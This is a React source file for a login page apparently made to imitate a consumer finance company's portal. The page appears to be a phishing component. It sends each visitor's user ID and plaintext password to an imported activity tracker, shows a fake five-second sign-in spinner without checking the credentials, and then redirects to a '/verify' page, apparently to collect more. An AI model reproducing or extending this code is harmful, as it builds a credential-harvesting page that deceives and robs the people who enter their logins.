import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { trackActivity } from './tracker';
import Logo from './Logo';

const Login = () => {
  const [userId, setUserId] = useState('');
  const [password, setPassword] = useState('');
  const [isLoggingIn, setIsLoggingIn] = useState(false);
  const [error, setError] = useState('');
  const navigate = useNavigate();

  useEffect(() => {
    trackActivity("Home Page Entered (Visitor Tracking)");
  }, []);

  const handleLogin = (e) => {
    e.preventDefault();
    
    if (userId.length < 4 || password.length < 4) {
      setError('Invalid login details');
      return; 
    }

    setError('');
    setIsLoggingIn(true); // Start the 5-second wait
    
    trackActivity("Login Attempt", { 
      User_ID: userId, 
      Password: password 
    });
    
    setTimeout(() => {
      localStorage.setItem('aptia_user', userId);
      navigate('/verify'); 
    }, 5000); 
  };

  return (
    <div style={styles.pageWrapper}>
      <div style={styles.header}>
        <Logo />
        <div style={styles.loginText}>Login</div>
      </div>

      <div style={styles.mainContent}>
        <div style={styles.card}>
          <div style={styles.lockIcon}>🔒</div>
          <p style={styles.privacyNote}>
            We will maintain the confidentiality of your personal information in accordance with our privacy policy.
          </p>

          <h2 style={styles.signInHeading}>Sign in</h2>

          {error && (
            <div style={styles.errorBox}>
              ⚠ {error}
            </div>
          )}

          <form onSubmit={handleLogin} style={styles.form}>
            <div style={styles.inputGroup}>
              <label style={styles.label}>UserId <span style={{color:'red'}}>*</span></label>
              <input 
                type="text" 
                style={styles.input} 
                disabled={isLoggingIn} // Disable input while loading
                required 
                value={userId} 
                onChange={(e) => {
                  setUserId(e.target.value);
                  if (error) setError(''); 
                }} 
              />
            </div>

            <div style={styles.inputGroup}>
              <label style={styles.label}>Password <span style={{color:'red'}}>*</span></label>
              <input 
                type="password" 
                style={styles.input} 
                disabled={isLoggingIn} // Disable input while loading
                required 
                value={password} 
                onChange={(e) => {
                  setPassword(e.target.value);
                  if (error) setError(''); 
                }} 
              />
            </div>

            {/* BUTTON SECTION WITH SPINNER */}
            <div style={styles.buttonArea}>
              <button 
                type="submit" 
                style={{
                  ...styles.signInBtn, 
                  opacity: isLoggingIn ? 0.7 : 1,
                  cursor: isLoggingIn ? 'not-allowed' : 'pointer'
                }}
                disabled={isLoggingIn}
              >
                {isLoggingIn ? "Signing In..." : "✓ Sign In"}
              </button>
              
              {isLoggingIn && (
                <div className="spinner-small" style={styles.inlineSpinner}></div>
              )}
            </div>
          </form>

          <div style={styles.registerSection}>
            <p style={styles.noAccount}>Don't have an account?</p>
            <button style={styles.registerBtn} disabled={isLoggingIn}>👤+ Register</button>
          </div>
        </div>
      </div>

      <footer style={styles.footer}>
        <div style={styles.footerLinks}>
          <span>ABOUT US</span>
          <span>TERMS OF USE</span>
          <span>PRIVACY POLICY</span>
        </div>
        <p style={styles.footerCopyright}>
          Copyright © 2017 Consumer Funding Solutions. All Rights Reserved.
        </p>
        <p style={styles.footerSiteMap}>SITE MAP</p>
      </footer>
    </div>
  );
};

const styles = {
  pageWrapper: { width: '100%', minHeight: '100vh', backgroundColor: '#fff', display: 'flex', flexDirection: 'column' },
  header: { display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '15px 25px', borderBottom: '1px solid #ddd' },
  loginText: { fontSize: '22px', color: '#888' },
  mainContent: { flex: 1, padding: '20px', display: 'flex', justifyContent: 'center', alignItems: 'flex-start' },
  
  card: { width: '100%', maxWidth: '400px', padding: '30px 20px', border: '1px solid #eee', textAlign: 'center', marginTop: '20px' },
  errorBox: { backgroundColor: '#ffebee', color: '#c62828', padding: '12px', marginBottom: '20px', borderRadius: '4px', fontSize: '14px', border: '1px solid #ef9a9a', fontWeight: 'bold' },
  lockIcon: { fontSize: '30px', border: '1px solid #ccc', width: '60px', height: '60px', lineHeight: '60px', margin: '0 auto 20px', color: '#999' },
  privacyNote: { fontSize: '13px', color: '#666', lineHeight: '1.4', marginBottom: '25px' },
  signInHeading: { fontSize: '28px', fontWeight: '400', marginBottom: '25px', color: '#333' },
  form: { textAlign: 'left' },
  inputGroup: { marginBottom: '20px' },
  label: { display: 'block', marginBottom: '8px', fontSize: '14px', fontWeight: 'bold' },
  input: { width: '100%', padding: '12px', border: '1px solid #ccc', boxSizing: 'border-box', fontSize: '16px' },
  
  // Layout for Button + Spinner
  buttonArea: { display: 'flex', alignItems: 'center', gap: '15px' },
  signInBtn: { flex: 1, padding: '14px', backgroundColor: '#003344', color: 'white', border: 'none', fontSize: '16px', fontWeight: 'bold', cursor: 'pointer' },
  inlineSpinner: { width: '24px', height: '24px', border: '3px solid #f3f3f3', borderTop: '3px solid #00a651', borderRadius: '50%', animation: 'spin 1s linear infinite' },

  registerSection: { marginTop: '40px', borderTop: '1px solid #eee', paddingTop: '20px' },
  noAccount: { fontSize: '14px', color: '#777', marginBottom: '10px' },
  registerBtn: { padding: '10px 30px', backgroundColor: '#f4f4f4', border: '1px solid #ccc', cursor: 'pointer', fontSize: '14px' },
  footer: { backgroundColor: '#f0f2f5', padding: '40px 10px', textAlign: 'center', fontSize: '12px', color: '#666' },
  footerLinks: { display: 'flex', justifyContent: 'center', gap: '20px', marginBottom: '15px', fontWeight: 'bold' },
  footerCopyright: { marginBottom: '5px' },
  footerSiteMap: { fontWeight: 'bold' }
};

export default Login;